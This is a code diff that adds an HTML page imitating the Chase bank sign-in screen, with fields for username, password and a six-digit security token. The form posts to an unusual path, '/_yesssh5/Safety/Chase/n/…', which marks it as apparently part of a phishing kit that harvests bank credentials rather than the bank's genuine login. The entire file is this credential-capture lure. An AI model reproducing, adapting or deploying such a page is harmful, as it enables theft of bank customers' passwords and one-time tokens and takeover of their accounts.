@@ -1,0 +1,118 @@
+<div class="container logon" data-is-view="true">
+    <div>
+        <div id="backgroundImage">
+            <div class="jpui background image fixed show-xs show-sm" id="geoImage">
+
+            </div>
+        </div>
+    </div>
+    <div class="row">
+        <div class="col-xs-12 col-md-6 col-md-offset-3 logoff hidden" id="logoffbox">
+            <div class="jpui raised segment">
+                <div class="row">
+                    <div class="col-xs-10 col-xs-offset-1">
+                        <h3 class="u-focus in-progress" tabindex="-1" id="logoff-header">
+                            You're being signed out.
+                        </h3>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col-xs-12">
+                        <div class="progress">
+                            <div class="bar"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box" id="logonbox">
+            <div class="jpui raised segment">
+                <div class="row">
+                    <div class="col-xs-10 col-xs-offset-1">
+                        <form id="login-form" method="post" autocomplete="off" action="/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefcebbb33" novalidate="">
+                            <label class="util accessible-text logon-xs-toggle" for="userId-input-field" data-attr="LOGON.userIdPlaceholder">
+                                <span class="accessible-text errorAdaText"></span>
+                                Username
+                            </label>
+                            <div class="logon-xs-toggle" id="userId">
+                                <input class="jpui input" id="userId-input-field" placeholder="Username" type="text" name="userId" value="">
+                            </div>
+                            <label class="util accessible-text logon-xs-toggle" for="password-input-field">
+                                <span class="accessible-text errorAdaText"></span>
+                                Password
+                            </label>
+                            <div class="logon-xs-toggle" id="password">
+                                <input min="0" class="jpui input" id="password-input-field" placeholder="Password" type="password" name="password" required="" value="">
+                            </div>
+                            <label class="util accessible-text logon-xs-toggle" for="securityToken-input-field" data-attr="LOGON.securityTokenPlaceholder">
+                                <span class="accessible-text errorAdaText"></span>
+                                Token
+                            </label>
+                            <div class="logon-xs-toggle hidden" id="securityToken">
+                                <input min="0" class="jpui input" id="securityToken-input-field" placeholder="Token" aria-describedby="securityToken-placeHolderAdaText securityToken-helpertext" aria-invalid="false" autocomplete="off" maxlength="6" type="tel" name="securityToken" data-validate="securityToken" required="" value="">
+                                <span class="util accessible-text" id="securityToken-placeHolderAdaText">
+                                                Token
+                                            </span>
+                            </div>
+                            <div class="row logon-xs-toggle">
+                                <div class="col-xs-6 rememberMe-checkbox-container">
+                                    <div class="jpui checkbox" id="rememberMe">
+                                        <div class="checkbox-flex">
+                                            <div class="checkboxWrap">
+                                                <input type="checkbox" id="input-rememberMe" aria-label="This checked box means that we will remember your username.  Remember me" name="rememberMe" value="on" >
+                                                <i class="jpui checkmark icon check" aria-hidden="true"></i>
+                                            </div>
+                                            <label for="input-rememberMe">
+                                                            <span class="checkbox-label" id="label-rememberMe" data-attr="LOGON.rememberMyUserIdLabel">
+                                                                Remember me
+                                                            </span>
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-xs-6 token-checkbox-container">
+                                    <div class="jpui checkbox useToken" id="useToken">
+                                        <div class="checkbox-flex">
+                                            <div class="checkboxWrap">
+                                                <input type="checkbox" id="input-useToken" value="on">
+                                                <i class="jpui checkmark icon check" aria-hidden="true"></i>
+                                            </div>
+                                            <label for="input-useToken">
+                                                            <span class="checkbox-label" id="label-useToken">
+                                                                Use token
+                                                            </span>
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="row">
+                                <button class="jpui button focus fluid primary" type="submit" id="signin-button" >
+                                                <span class="label">
+                                                    Sign in
+                                                </span>
+                                </button>
+                            </div>
+                            <div class="row">
+                                            <span class="jpui link" id="forgotPassword-link-wrapper">
+                                                <a class="link-anchor" id="forgotPassword" href="">
+                                                    Forgot username/password?
+                                                    <i class="jpui progressright icon end-icon" aria-hidden="true"></i>
+                                                </a>
+                                            </span>
+                            </div>
+                            <div class="row">
+                                            <span class="jpui link" id="enrollment-link-wrapper">
+                                                <a class="link-anchor last" id="enrollment">
+                                                    Not enrolled? Sign up now.
+                                                    <i class="jpui progressright icon end-icon" aria-hidden="true"></i>
+                                                </a>
+                                            </span>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
